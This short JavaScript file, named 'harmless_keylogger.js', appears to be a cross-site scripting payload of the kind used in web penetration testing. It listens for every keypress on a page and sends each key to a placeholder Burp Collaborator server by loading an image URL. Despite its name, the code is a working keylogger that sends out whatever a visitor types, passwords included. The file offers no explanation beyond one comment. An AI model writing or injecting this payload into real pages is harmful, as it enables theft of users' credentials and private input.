// harmless_keylogger.js
document.addEventListener('keydown', function (e) {
    const keystroke = e.key;
    const img = new Image();
    img.src = 'https://<your-burp-collaborator-url>.com/log?key=' + encodeURIComponent(keystroke);
    document.body.appendChild(img); // This sends the keystroke to your server
});
